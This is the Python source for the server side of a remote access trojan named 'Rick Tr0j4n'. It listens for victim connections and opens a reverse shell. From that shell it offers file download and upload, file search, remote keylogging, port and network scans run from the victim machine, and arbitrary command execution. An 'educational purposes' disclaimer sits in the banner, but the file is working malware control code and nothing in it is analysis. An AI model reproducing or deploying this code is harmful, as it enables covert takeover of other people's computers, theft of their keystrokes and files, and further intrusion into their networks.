# -*- coding: utf-8 -*-
#rick trojan version 1.0
#server program

#library
import socket
import os
import time
import sys

import signal
import subprocess
from signal import signal, SIGPIPE, SIG_DFL
signal(SIGPIPE, SIG_DFL)


def banner():
     print("""
                  ****
                  #   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄    ▄       ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄        ▄ 
                  #  ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌ ▐░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░▌      ▐░▌
                  #  ▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌ ▐░▌       ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█░█▀▀▀▀▀█░▌▀▀▀▀▀█░█▀▀▀ ▐░▌       ▐░▌▐░▌░▌     ▐░▌
                  #  ▐░▌       ▐░▌     ▐░▌     ▐░▌          ▐░▌▐░▌            ▐░▌     ▐░▌       ▐░▌▐░▌▐░▌    ▐░▌     ▐░▌    ▐░▌       ▐░▌▐░▌▐░▌    ▐░▌
                  #  ▐░█▄▄▄▄▄▄▄█░▌     ▐░▌     ▐░▌          ▐░▌░▌             ▐░▌     ▐░█▄▄▄▄▄▄▄█░▌▐░▌ ▐░▌   ▐░▌     ▐░▌    ▐░█▄▄▄▄▄▄▄█░▌▐░▌ ▐░▌   ▐░▌
                  #  ▐░░░░░░░░░░░▌     ▐░▌     ▐░▌          ▐░░▌              ▐░▌     ▐░░░░░░░░░░░▌▐░▌  ▐░▌  ▐░▌     ▐░▌    ▐░░░░░░░░░░░▌▐░▌  ▐░▌  ▐░▌
                  #  ▐░█▀▀▀▀█░█▀▀      ▐░▌     ▐░▌          ▐░▌░▌             ▐░▌     ▐░█▀▀▀▀█░█▀▀ ▐░▌   ▐░▌ ▐░▌     ▐░▌     ▀▀▀▀▀▀▀▀▀█░▌▐░▌   ▐░▌ ▐░▌
                  #  ▐░▌     ▐░▌       ▐░▌     ▐░▌          ▐░▌▐░▌            ▐░▌     ▐░▌     ▐░▌  ▐░▌    ▐░▌▐░▌     ▐░▌              ▐░▌▐░▌    ▐░▌▐░▌
                  #  ▐░▌      ▐░▌  ▄▄▄▄█░█▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌ ▐░▌           ▐░▌     ▐░▌      ▐░▌ ▐░█▄▄▄▄▄█░█░▌▄▄▄▄▄█░▌              ▐░▌▐░▌     ▐░▐░▌
                  #  ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌          ▐░▌     ▐░▌       ▐░▌ ▐░░░░░░░░░▌▐░░░░░░░▌              ▐░▌▐░▌      ▐░░▌
                  #   ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀    ▀            ▀       ▀         ▀   ▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀                ▀  ▀        ▀▀ 
                  #    Rick Tr0j4n v0.1 by Rick Hack
                  #
                  #                                         This is hacking tool with a reverse trojan (client / server)
                  #
                  #                     it is recommended that it be used for educational purposes, I am not responsible for malicious use!
                  #                                                         Keep hacking .....
                  #  
                  #  When the client connect to the server, you will receive a reverse shell
                  #   
           """)

def help_menu():
    print("""
                  #    The options for use are:
                  #
                          + download <remote path+filename> ex: download c:\test.txt
                          + upload <localpath+filename>     ex: upload /root/file.img
                          + portscan
                          + terminate/exit to stop the connect
                          + search (to search a file in victim machine
                          + "dir" (to list files in current victim machine
                          + "Keylogger on" to turn on the keylogger in remote machine
                          + and another winddows cmd commands
                  
                  """)


def transfer_up(conn,command,path):
    conn.send(command.encode())
    f = open(path, 'rb')
    packet = f.read(2048)
    while len(packet) > 0:
        conn.send(packet)
        packet = f.read(2048)
        conn.send('DONE'.encode())
        f.close()
    time.sleep(10)
    print("type 'dir' command to see your uploded file")
    

def transfer(conn, command):
    conn.send(command.encode())
    download, path = command.split(" ")
    f = open(path, 'wb')
    while True:
        bits = conn.recv(2048)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4])
            f.close()
            print('[+] transfer completed')
            break
        if 'file not found'.encode() in bits:
            print('[-] impossible to transfer')
            break
        f.write(bits)


#open local port
def conexao():

    cmd = "fuser -k 8080/tcp"
    os.system(cmd)
    cmd = "freeport 8080"
    os.system(cmd)
    cmd = "lsof -t -i tcp:8080 | xargs kill -9"
    os.system(cmd)
    


    c = socket.socket()
    
    c.bind(('192.168.15.49',8081))
        
        
    c.listen(50)
    conn, addr = c.accept()
    print('[+] Connection stabelished from victm', addr)

    while True:

        command = input("Shell> ")
        if command == '':
            print("enter a valid command!")
            command = "whoami"

        elif 'help' in command:
            banner()
            help_menu()

        elif 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            break

        elif 'download' in command:
            transfer(conn, command)

        elif 'upload ' in command:
            print("ex: upload /root/file.txt outfile.txt")
            list = command.split()
            file_output = list[2]
            print(file_output)
            path = list[1]
            print(path)
            if os.path.exists(path):
                print("file exist :" + path)
                try:
                    transfer_up(conn,command,path)
                except Exception as e:
                    conn.send(str(e).encode())
                    pass
                time.sleep(5)
                ret = conn.recv(2048)
                ret = ret.decode('utf-8',errors='ignore')
                print(ret)
            else:
                print("file not exists :" + path)

        elif 'portscan' in command:
            ip_target = input("Type the target Ip: (ex: 10.0.0.1): ")
            ports_target = input("Type the target Ports: (ex: 21,22,23,80,53): ")
            target = ("portscan " + ip_target +" " + ports_target)
            print(target)
            conn.send(target.encode())
            ret = conn.recv(2048)
            ret = ret.decode('utf-8',errors='ignore')
            print(ret)
            print("\n")
            print("Please wait for results...\n")
            time.sleep(15)
            conn.send("echo '1'".encode())
            time.sleep(2)
            conn.send("echo '1'".encode())
            ret = conn.recv(2048)
            ret = ret.decode('utf-8',errors='ignore')
            print(ret)

        elif 'networkscan' in command:
             ip_range = input("Type the Ip range: (ex: 192.168.15.1/24): ")
             target = ("networkscan " + ip_range)
             conn.send(target.encode())
             time.sleep(2)
             ret = conn.recv(2048)
             ret = ret.decode('utf-8',errors='ignore')
             print(ret)
             time.sleep(5)
             conn.send("echo '1'".encode())
             ret = conn.recv(2048)
             ret = ret.decode('utf-8',errors='ignore')
             print(ret)
             
          
        elif 'exit' in command:
            conn.send('exit'.encode())
            conn.close()
            time.sleep(2)
            cmd = "fuser -k 8080/tcp &"
            os.system(cmd)
            cmd = "freeport 8080 &"
            os.system(cmd)
            cmd = "lsof -t -i tcp:8080 | xargs kill -9"
            os.system(cmd)
            cmd = "fuser -k rick_trojan_server.py"
            os.system(cmd)
            break

        elif 'search ' in command:
            conn.send(command.encode())
            ret = conn.recv(2048)
            ret = ret.decode('utf-8',errors='ignore')
            print(ret)
            

        elif 'dir' in command:
            conn.send('dir'.encode())

            for i in range(3):
                ret = conn.recv(2048)
                ret = ret.decode('utf-8',errors='ignore')
                print(ret)
                time.sleep(1)
                conn.send("echo '1'".encode())

       
        elif 'keylogger on' in command:
            conn.send(command.encode())
            ret = conn.recv(2048)
            ret = ret.decode('utf-8',errors='ignore')
            print(ret)
            

        else:
            conn.send(bytes(command,"utf-8"))
            time.sleep(2)
            ret = conn.recv(2048)
            #ignore errors on return command if have special chars
            ret = ret.decode('utf-8',errors='ignore')
            print(ret)
    

def main():
    banner()
    #help_menu()
    cmd = "ps -aux | grep 8080 | awk '{print $2}' | xargs kill -9"
    os.system(cmd)
    time.sleep(2)
    conexao()
main()
